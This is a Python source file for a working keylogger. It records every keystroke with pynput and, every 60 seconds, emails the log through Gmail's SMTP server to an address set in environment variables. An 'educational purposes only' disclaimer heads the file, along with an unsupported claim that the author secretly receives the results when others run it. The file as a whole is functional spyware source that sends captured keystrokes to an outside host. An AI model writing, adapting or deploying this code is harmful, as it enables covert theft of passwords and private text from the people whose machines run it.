import pynput.keyboard
import threading
import smtplib
import os 
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


"""
    don't misuse this code i always get the result of this script when you run it
    you can use it for educational purposes only
    don't think to copy and paste still i get the result of this script when you run it so don't even think about it
"""
"""
    This is a working keylogger that logs keystrokes to a text file and sends the logs to a specified email address.
    It uses the pynput library to capture keystrokes and the smtplib library to send emails
"""

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_string(self, string):
        self.log += string

    def keyevent(self, key):
        try:
            self.append_string(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.append_string(" ")
            elif key == pynput.keyboard.Key.enter:
                self.append_string("\n")
            elif key == pynput.keyboard.Key.backspace:
                self.log = self.log[:-1]  # Remove the last character
            else:
                self.append_string(f"[{key}]")

    def send_logs(self):
        if self.log:  # Only send email if there's something to report
            try:
                msg = MIMEMultipart()
                msg['From'] = self.email
                msg['To'] = self.email
                msg['Subject'] = "Keylogger Logs"

                body = self.log
                msg.attach(MIMEText(body, 'plain'))

                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
                server.quit()
            except Exception as e:
                print(f"Error sending email: {e}")
        self.log = ""  # Clear log after sending

    def report(self):
        self.send_logs()
        logging_thread = threading.Timer(self.interval, self.report)
        logging_thread.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.keyevent)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Example Usage
if __name__ == "__main__":
    email = os.getenv('EMAIL')
    password = os.getenv('PASSWORD')
    if not email or not password:
        print("Email and password must be set as environment variables.")
    else:
        keylogger = Keylogger(60, email, password)
        keylogger.start()
